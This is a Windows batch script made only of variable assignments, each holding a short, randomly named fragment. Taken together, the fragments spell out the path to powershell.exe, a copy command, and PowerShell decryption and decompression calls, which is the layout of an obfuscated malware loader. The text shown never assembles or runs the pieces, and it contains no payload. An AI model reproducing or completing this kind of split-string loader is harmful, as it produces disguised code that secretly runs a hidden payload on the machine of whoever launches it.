@echo off
set "BTNmSaWJuC=nd"
set "haywaUKpas=32"
set "fIjqmkoeUv=y "
set "giQOpPLymj=Wi"
set "kJKANmDUuN= C"
set "AHYuatrThk=he"
set "knQrHRAaoR=em"
set "AgNTymqnLX=he"
set "ZtBmTNFyHU=ow"
set "LxqGXRUEqe=py"
set "GOSeEjbnga=ll"
set "CzmUVtNuUv=\v"
set "vXSSYcpjkD=:\"
set "CKtNYbSVkX=s\"
set "kqtTzEZcOR=.e"
set "aPOiwhVqrx=rs"
set "KGkiOCnVap=co"
set "zWsqPCnCLC=we"
set "hCdhlAHRid=1."
set "BeIllBjFZX=Sy"
set "fuDWDyTfvA=0\"
set "fDABDRXYpv=xe"
set "frJXcIHXmB=ll"
set "toaJNonqEu=in"
set "uNlkZaUSYe=po"
set "gFPIENHEUB=st"
set "biriQfgsIJ=do"
set "csDCXlOgDK=ws"
set "HuKGqvIpTI=we"
set "luuAVlXKEm= /"
set "WPSdxSaPJL=Po"
set "EZyKOWVKik=\W"
set "PCcyibLxLC=rS"
set "eHAJMWJRei= %~dp0"
set "ZdJSCRwfqc=cd"
set "UmkbhvSPBX=1] -"
set "SdcMnxXsXw=ach "
set "XWFLSgNzuK=evj "
set "elkTOUfFbk=[Sys"
set "cXqmojKbia=PxEW"
set "dwcrYBEZQa=erc."
set "nxjCmHNWWf='gni"
set "qZvKXWXgmU=RmAx"
set "ionrdbOKDX=Fina"
set "ZoaghYWRxx= = ["
set "AqvpBtklQP=).Sp"
set "HQNolYRGpu=Stre"
set "SgbtMkDvJM=dj0C"
set "mAtQdDOFHK=n ''"
set "djDftklONQ=m(, "
set "suKEJSYKFq=eja "
set "mtzLQIVaTM=($NG"
set "OJSIHUxQAi=6] -"
set "ldgnQzvjbK=; };"
set "fgUdIwWcOy=Obje"
set "pElHhOmsqn=yste"
set "ofqZjfqSkl=rans"
set "zQroqZgpIy=.Mem"
set "yERQhTMvYw=Zg.T"
set "deLvLkxnAQ=rt]:"
set "kEMBvqyITZ=sion"
set "PLNdZBuVum=urit"
set "xAOQiPukMS=pose"
set "rDNewPMbrc=orF'"
set "gcHfblpnMO=('da"
set "qXuNgyxmoe=ew-O"
set "JvxoVtHWdT=-joi"
set "lKQuXjeuNe=jd ="
set "svDvwWAOcG=nbej"
set "JktJytwDzZ=$qmE"
set "XefAVkUJud=:('g"
set "crhiEaRZVh=qmEx"
set "GaDuDPaoBH=ispo"
set "qsTPxGefMU=ode]"
set "FYlVMsoiAK=Star"
set "TMLfdpYlKF=PKCS"
set "fPCztTQAke=t Sy"
set "eGnbsvXhbd=ea.D"
set "AquopdvjLt= [st"
set "GoJPPSTzIW=gjYA"
set "sqmXZqdXGA=S46e"
set "EWgtEzbJZX=raph"
set "bUVAEwBqbr=rity"
set "IIIZNFyvCd=Syst"
set "ikUKzNIvOo=ueQe"
set "NayXLkRFuF=[Sys"
set "moMSITBXVk=.Com"
set "rAUYwvhTQD=L4Yi"
set "vSqdafVgEx=TllA"
set "TEfLqUgLyQ=k; }"
set "WHjLXvbyLK=xy);"
set "ntpEhHDDWK=iron"
set "OEJsbjFyqq= = $"
set "iLAqpBVnVT=pres"
set "mkpmztHqaJ=-4] "
set "vJIYxHRhBE=[-1."
set "nNRbfDBJQn=lBlo"
